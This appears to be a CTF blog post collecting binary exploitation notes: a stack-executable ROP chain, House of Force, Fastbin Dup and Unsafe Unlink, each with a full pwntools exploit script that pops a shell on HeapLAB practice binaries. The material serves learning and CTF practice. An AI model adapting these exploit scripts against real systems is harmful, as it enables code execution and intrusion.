---
title: "Binary Exploitation Techniques"
excerpt: Stack and Heap exploitation techniques for pwn challenges in CTFs.
categories: Blog
--- 

# ROP

## ret2stack: Making the stack executable
1. Set value of `__stack_prot` to 7
2. Call `_dl_make_stack_executable(__libc_stack_end, __stack_prot)`
3. Jump to shellcode

**Example**
```python
shellcode = asm(shellcraft.sh())

_dl_make_stack_executable = elf.symbols['_dl_make_stack_executable']
__stack_prot = elf.symbols['__stack_prot']
__libc_stack_end = elf.symbols['__libc_stack_end']

payload = 'A'*120
payload += p64(0x0000000000410ca3) # pop rsi ; ret
payload += p64(__stack_prot)
payload += p64(0x00000000004163f4) # pop rax ; ret
payload += p64(0x7)
payload += p64(0x000000000047ff91) # mov qword ptr [rsi], rax ; ret
payload += p64(0x0000000000400696) # pop rdi ; ret
payload += p64(__libc_stack_end)
payload += p64(_dl_make_stack_executable)
payload += p64(0x0000000000451974) # push rsp ; ret
payload += shellcode
```

## ret2csu: Lack of gadgets in x64 
[Link](https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html?m=1)

# Heap

## House of Force: Exploiting Top Chunk header to gain nearly-arbitrary write primitive

**Requirements**
* Control of top chunk size, usually through heap overflow
* Full control of size of allocated chunks

**Arbitrary Write Primitive**
* Overwrite size of top chunk to `0xffffffffffffffff`
* Allocate chunk with size of `offset`, using `malloc()`
    * If `target < top_chunk`: `offset = top_chunk - target + allocated_chunks_size`, and offset is negative
    * If `target > top_chunk`: `offset = target - top_chunk - allocated_chunks_size`
* Allocate new chunk, this chunk will be created at `target`

**Gaining RCE using ret2libc**  
_This requires libc version to be known_
* Overwrite `__malloc_hook` using write primitive with `system()`
* Call `malloc(/bin/sh)`

**Example:** HeapLAB `House of Force`
```python
from pwn import *

config = {
    "elf" : "./house_of_force",
    "libc" : "./libc-2.28.so",
    "ld" : "./ld.so.2",
}

def malloc(size, data):
    sla('>', '1')
    sla('size:', str(size))
    sla('data:', data)

def exploit(p):
    # Get addresses
    ru('puts() @ ')
    puts = int(p.recvline().strip(), 16)
    ru('heap @ ')
    heap_addr = int(p.recvline().strip(), 16)
    
    # Calculate libc_base, etc...
    libc.address = puts - libc.symbols['puts']
    malloc_hook = libc.symbols['__malloc_hook']
    system = libc.symbols['system']
    binsh = libc.search('/bin/sh\x00').next()

    lg('heap_addr: ' + hex(heap_addr))
    lg('malloc_hook: ' + hex(malloc_hook))
    lg('system: ' + hex(system))
    lg('binsh: ' + hex(binsh))
    
    # House of Force: Overwrite top_chunk size
    malloc(24, '/bin/sh\x00'.ljust(24, "\x00") + p64(0xffffffffffffffff))
    
    """
    # Overwrite target with "OVERWRIT"
    target = elf.symbols['target']
    top_chunk = heap_addr + 0x20
    offset = top_chunk - target + 32
    ru('>')
    malloc(-offset, p64(0xdeadbeef))
    malloc(16, 'OVERWRIT')
    sla('>', '2')
    """

    # Pop shell with ret2libc by overwriting __malloc_hook with system() 
    top_chunk = heap_addr + 0x20
    offset = malloc_hook - top_chunk - 32
    ru('>')
    malloc(offset, "Y") 
    malloc(24, p64(system))
    sla('>', '1')
    sla('size:', str(binsh))

    p.interactive()

if __name__ == "__main__":
    elf = context.binary = ELF(config["elf"])
    libc = ELF(config["libc"])

    p = process([config["ld"], config["elf"]], env={"LD_PRELOAD" : config["libc"]})
    pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    ru = lambda a: p.recvuntil(a)
    lg = lambda a : log.info(a)

    exploit(p)
```

## Fastbin Dupe: Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist to gain an arbitrary write primitive

**Requirements**
* Allocate chunks in fastbin size, `0x20 - 0x80`
* Ability to free chunks in any order
* Ability to forge or find fake chunk

**Arbitrary Write Primitive**  
_Assuming `target` is the address to be overwritten_
* Allocate 2 chunks, free them in alternating order: `free(1), free(0), free(1)`. This causes the `fd` pointer of the second chunk to link back to the first in the fastbin list.
* Forge a fake chunk somehow at `target - 16`, `target - 8` must hold chunk size equal to size of previous chunks.
* Allocate chunk, with `target - 16` as the data to overwrite the `fd` pointer in the fastbin list.
* Allocate 2 more chunks to free up fastbin list. Last address in the fastbin list will point to the fake chunk.
* Allocate chunk with data to be written to `target`.

**Gaining RCE using ret2libc**  
_This requires libc version to be known_
* Overwrite `__malloc_hook` using write primitive with `one_gadget`
    * Fake chunk can be found using `find_fake_fast &__malloc_hook` in `pwndbg`
    * Chunk size of all previous chunks must be same as chunk size in this fake chunk
    * As chunk is not allocated with alignment, data when overwriting becomes `padding + one_gadget`
* Call `malloc()`

**Example:** HeapLAB `fastbin_dup`
```python
from pwn import *

config = {"elf" : "./fastbin_dup"}

def malloc(size, data):
    sla('> ', '1')
    sla('size: ', str(size))
    sla('data: ', data)

def free(index):
    sla('> ', '2')
    sla('index: ', str(index))

def exploit(p):
    # Get puts leak
    ru('puts() @ ')
    puts = int(p.recvline().strip(), 16)
    
    # Setting random username
    sla('username: ', 'JEFFJOHN')
    
    # Calculate libc addresses
    libc.address = puts - libc.symbols['puts']
    one_gadget = libc.address + 0xe1fa1
    malloc_hook = libc.symbols['__malloc_hook']
    
    # Fastbin dup
    malloc(0x68, "A"*8)
    malloc(0x68, "A"*8)

    free(1)
    free(0)
    free(1)

    # Overwrite __malloc_hook with one_gadget 
    fake_chunk = malloc_hook - 35
    malloc(0x68, p64(fake_chunk))
    malloc(0x68, "A"*8)
    malloc(0x68, "A"*8)
    malloc(0x68, "A"*19 + p64(one_gadget))

    # Pop shell
    sla('> ', '1')
    sla('size: ', '1')

    lg('Fake Chunk: ' + hex(fake_chunk))
    lg('malloc_hook: ' + hex(malloc_hook))
    lg('One_gadget: ' + hex(one_gadget))

    p.interactive()

if __name__ == "__main__":
    elf = context.binary = ELF(config["elf"])
    libc = elf.libc

    p = process(elf.path)
    pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    ru = lambda a: p.recvuntil(a)
    lg = lambda a : log.info(a)

    exploit(p)
```

## Unsafe Unlink: Exploiting free on a corrupted chunk to gain arbitrary 8-byte write

**Requirements**
* Allocate chunks in the unsorted bin, `120 - 1000 bytes`
* Ability to corrupt `prev_size` and `prev_in_use` flag of a chunk, usually through heap overflow
* Ability to forge a fake freed chunk by writing valid `fd` and `bk` pointers in a chunk's data
    * `fd` and `bk` must both be writable addresses, such as GOT

**Arbitrary Write Primitive**  
_Assuming `target` is the address to be overwritten_
* Allocate 2 chunks in the unsorted bin
* In the fake free chunk:
    * `fd (first 8 bytes in chunk data)` contains `target`
    * `bk (next 8 bytes in chunk data)` contains 8-bytes to be written to `target`
* In the corrupted chunk:
    * Overwrite `prev_size` to be the size of the previous fake free chunk
    * Overwite `prev_in_use` to be 0, `size` of chunk `0x91 -> 0x90`
* Free the corrupted chunk
    * `bk` will contain `fd`, vice versa

**Example:** HeapLAB `unsafe_unlink`  
`chunk A: fake free chunk, chunk B: corrupted chunk`  
RCE is gained by writing address of chunk A's data to `__free_hook`, and writing shellcode in chunk A's data as `NX` is not set.
```python
from pwn import *

config = {"elf" : "./unsafe_unlink"}

def malloc(size):
    sla('> ', '1')
    sla('size: ', str(size))

def edit(index, data):
    sla('> ', '2')
    sla('index: ', str(index))
    sla('data: ', data)

def free(index):
    sla('> ', '3')
    sla('index: ', str(index))

def exploit(p):
    # Get puts and heap leak
    ru('puts() @ ')
    puts = int(p.recvline().strip(), 16)
    ru('heap @ ')
    heap_addr = int(p.recvline().strip(), 16)
    
    # Calculate libc addresses
    libc.address = puts - libc.symbols['puts']
    free_hook = libc.symbols['__free_hook']

    malloc(0x88)
    malloc(0x88)
    
    # In chunk A: Forge fake free chunk by faking fd and bk
    # In chunk B: Overwrite prev_size and prev_in_use to make the heap think A is freed
    fd = free_hook - 24
    bk = heap_addr + 0x10
    prev_size = 0x90
    size = 0x90
    data = p64(fd) + p64(bk) + '\x00'*112 + p64(prev_size) + p64(size)
    edit(0, data)

    # Free chunk B, heap will try to consolidate A and B with unlinking
    # Overwrite fd with bk, bk with fd due to unsafe unlinking
    # __free_hook now points to data of chunk A
    free(1)

    # Write shellcode into data of chunk A
    shellcode = asm(shellcraft.sh())
    edit(0, shellcode)

    # Pop shell using free() and __free_hook
    free(0)
    
    lg('heap_addr: ' + hex(heap_addr))

    p.interactive()

if __name__ == "__main__":
    elf = context.binary = ELF(config["elf"])
    libc = elf.libc

    p = process(elf.path)
    pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    ru = lambda a: p.recvuntil(a)
    lg = lambda a : log.info(a)

    exploit(p)
```
